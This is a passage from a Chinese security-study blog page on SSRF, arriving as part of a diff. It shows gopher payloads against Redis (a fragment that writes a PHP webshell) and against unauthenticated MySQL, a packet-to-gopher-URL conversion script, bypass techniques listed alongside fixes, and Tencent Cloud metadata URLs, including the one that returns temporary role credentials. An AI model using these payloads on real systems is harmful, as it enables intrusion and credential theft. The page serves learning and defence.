class="hljs-number">1</span>]);?&gt;<br> <br> <br><span class="hljs-string">\r</span><br>*<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>save<span class="hljs-string">\r</span><br><br></code></pre></td></tr></table></figure>
+
+<p>注意Redis 的协议是以 CRLF (rn) 结尾，所以转换的时候需要把 \r 转换为 \r\n</p>
+<p><img src="/img/image-20251203171521940.png" srcset="/img/loading.gif" lazyload alt="image-20251203171521940"></p>
+<p>随后进行两次url编码，发包</p>
+<p><img src="/img/image-20251203171556959.png" srcset="/img/loading.gif" lazyload alt="image-20251203171556959"></p>
+<h3 id="gopher打未授权Mysql"><a href="#gopher打未授权Mysql" class="headerlink" title="gopher打未授权Mysql"></a>gopher打<strong>未授权Mysql</strong></h3><p>这里同样是两种方法一种是直接用工具构造playload<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
+<p>运行命令</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2.<span class="hljs-number">7</span> gopherus<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--exploit</span> mysql<br></code></pre></td></tr></table></figure>
+
+<p>随后输入mysql用户和要执行的sql语句</p>
+<p><img src="/img/image-20251203215047221.png" srcset="/img/loading.gif" lazyload alt="image-20251203215047221"></p>
+<p>最后发送gopher伪协议即可</p>
+<p><img src="/img/image-20251203215145242.png" srcset="/img/loading.gif" lazyload alt="image-20251203215145242"></p>
+<p><img src="/img/image-20251203215128232.png" srcset="/img/loading.gif" lazyload alt="image-20251203215128232"></p>
+<p>第二种方法是手动构造mysql数据包</p>
+<p>首先监听3306端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># lo 回环接口网卡 -w 报错 pcapng 数据包</span><br><span class="hljs-attribute">tcpdump</span> -i lo port <span class="hljs-number">3306</span> -w mysql.pcapng<br></code></pre></td></tr></table></figure>
+
+<p>随后在本地执行mysql命令</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">mysql -uroot -h127.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span> -e <span class="hljs-string">&quot;select * from flag.test&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>Wireshark 打开 mysql.pcapng 数据包，追踪 TCP 流 然后过滤出发给 3306 的数据然后过滤出客户端发送到MySQL服务器的数据包，将显示格式调整为原始数据即可：</p>
+<p><img src="/img/645861655.png" srcset="/img/loading.gif" lazyload alt="81830-ph696qxna6b.png"></p>
+<p>然后使用如下的 Python3 脚本将数据转化为 url 编码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">results</span>(<span class="hljs-params">s</span>):<br>    a=[s[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>.join(a)<br><br>s=<span class="hljs-string">&quot;3c00000185a20f0000000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f726400210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031180000000373656c656374202a2066726f6d20666c61672e746573740100000001&quot;</span><br><br><span class="hljs-built_in">print</span>(results(s))<br><br></code></pre></td></tr></table></figure>
+
+<p>放入到 BP 中请求的话记得需要二次 URL 编码,成功查询到flag</p>
+<p><img src="/img/2776210982.png" srcset="/img/loading.gif" lazyload alt="58024-tt42tmq7t6.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h4 id="SSRF-漏洞的成因："><a href="#SSRF-漏洞的成因：" class="headerlink" title="SSRF 漏洞的成因："></a><strong>SSRF 漏洞的成因：</strong></h4><ol>
+<li><p>直接使用用户输入的 URL 作为请求目标；</p>
+</li>
+<li><p>不适当的协议和端口控制；</p>
+</li>
+<li><p>内部网络或敏感资源未加隔离或防护；</p>
+</li>
+<li><p>不正确的权限和访问控制。</p>
+<table>
+<thead>
+<tr>
+<th><strong>潜在绕过手法（供防御方识别风险）</strong></th>
+<th><strong>安全修复方法（推荐）</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IP 进制转换（如 <em>127.0.0.1 → 2130706433</em>）</td>
+<td>将 IP <strong>统一解析为标准 IPv4&#x2F;IPv6</strong> 后再判断是否属于内网段</td>
+</tr>
+<tr>
+<td>域名混淆（如 <em>example.com → example.com. → 实际解析到内网</em>）</td>
+<td>解析域名 → 获取真实 IP → <strong>按解析结果校验内网范围</strong></td>
+</tr>
+<tr>
+<td>重定向绕过（如合法域名跳转到 <em>内网 IP</em>）</td>
+<td>禁用自动重定向（<code>followRedirects = false</code>）或对重定向后的 URL <strong>重新校验</strong></td>
+</tr>
+<tr>
+<td>协议混淆（如 <em>dict:&#x2F;&#x2F; → DICT:&#x2F;&#x2F; → dict%3A&#x2F;&#x2F;</em>）</td>
+<td>对 URL 进行 <strong>标准化（lowercase + decode）</strong> 再检查协议，仅允许 http&#x2F;https</td>
+</tr>
+<tr>
+<td>端口绕过（如 <em>6379 → 06379 → 6379&#x2F;</em>）</td>
+<td><strong>标准化端口号</strong>，并限制仅允许 80&#x2F;443 等安全端口范围</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<h4 id="SSRF-漏洞的修复方法："><a href="#SSRF-漏洞的修复方法：" class="headerlink" title="SSRF 漏洞的修复方法："></a><strong>SSRF 漏洞的修复方法：</strong></h4><ol>
+<li><strong>输入验证与白名单</strong>：只允许特定格式和协议的 URL，禁止内网访问；</li>
+<li><strong>服务端访问控制</strong>：严格的权限校验，尤其是针对内网和敏感资源；</li>
+<li><strong>代理与白名单</strong>：通过代理服务器转发请求，并对目标进行访问控制；</li>
+<li><strong>防止 DNS Rebinding</strong>：对 IP 地址与域名进行比对；</li>
+<li><strong>日志与监控</strong>：记录外部请求，并及时分析检测异常行为。</li>
+</ol>
+<p>通过这些修复措施，可以有效地减轻 SSRF 漏洞的风险，保护应用程序免受此类攻击。</p>
+<h2 id="拓展-云上SSRF"><a href="#拓展-云上SSRF" class="headerlink" title="拓展-云上SSRF"></a>拓展-云上SSRF</h2><p>其实云上ssrf和普通ssrf原理相似但是云上ssrf危害更大，攻击面更广。</p>
+<p>在云服务ssrf利用中：</p>
+<p>1、攻击元数据服务：云环境中，云数据即表示实例，可以用来查看、配置甚至管理正在运行中的实例。</p>
+<p>2、攻击存储桶：攻击者通过访问元数据中存储的临时秘钥或者用于自启动实例的启动脚本，这些脚本可能会包含AK、密码、源码等等，然后根据从元数据服务获取的信息，攻击者可尝试获取到受害者账户下COS、CVM、集群等服务的权限。</p>
+<p>3、攻击Kubelet API：在云环境中，可通过Kubelet API查询集群pod和node的信息，也可通过其执行命令。（Kubernetes API 用于与集群及其各种资源进行交互。有不同的资源类型和资源实例，以API对象的形式存在。是集群的一部分，API 会指导它们在必要时执行特定操作。）</p>
+<p>4、越权攻击云平台内其他组件或服务：由于云上各组件相互信任，当云平台内某个组件或服务存在SSRF漏洞时，就可通过此漏洞越权攻击其他组件或者服务。</p>
+<p><strong>其实最常见的攻击手法就是攻击元数据服务</strong></p>
+<p>在腾讯云中可以利用ssrf读取如下数据：</p>
+<p>1、获取实例物理所在地信息。</p>
+<p><a target="_blank" rel="noopener" href="http://metadata.tencentyun.com/latest/meta-data/placement/region">http://metadata.tencentyun.com/latest/meta-data/placement/region</a></p>
+<p><img src="/img/f934081435a063dfe864b9e1dd048a9d793e56e4e6794.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>2、获取实例内⽹ IP。实例存在多张⽹卡时，返回 eth0 设备的⽹络地址。</p>
+<p><a target="_blank" rel="noopener" href="http://metadata.tencentyun.com/latest/meta-data/local-ipv4">http://metadata.tencentyun.com/latest/meta-data/local-ipv4</a></p>
+<p><img src="/img/f6659620931978b397557dc958bdddc2cb7c555ebec27.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>3、获取实例公⽹ IP</p>
+<p><a target="_blank" rel="noopener" href="http://metadata.tencentyun.com/latest/meta-data/public-ipv4">http://metadata.tencentyun.com/latest/meta-data/public-ipv4</a></p>
+<p><img src="/img/f39598983601b8fd0a9a8d4586442fde74fb77bea2a55.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>4、获取实例网络接口 VPC 网络 ID。</p>
+<p><a target="_blank" rel="noopener" href="http://metadata.tencentyun.com/network/interfaces/macs/$%7Bmac%7D/vpc-id">http://metadata.tencentyun.com/network/interfaces/macs/${mac}/vpc-id</a></p>
+<p><img src="/img/f6404350d6b402b4a4e34f6650a352bcaa8a8336d8d83.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>5、在获取到⻆⾊名称后，可以通过以下链接取⻆⾊的临时凭证，${role-name} 为 CAM 角⾊的名称：</p>
+<p><a target="_blank" rel="noopener" href="http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials$%7Brolename%7D">http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials${rolename}</a></p>
+<p><img src="/img/f606276e13359e8a07d71c11e88837512bf7ea5689ba9.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E6%B8%97%E9%80%8F/" class="category-chain-item">Web渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SSRF/" class="print-no-link">#SSRF</a>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/20/XXE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" title="XXE学习总结">
+                        <span class="hidden-mobile">XXE学习总结</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
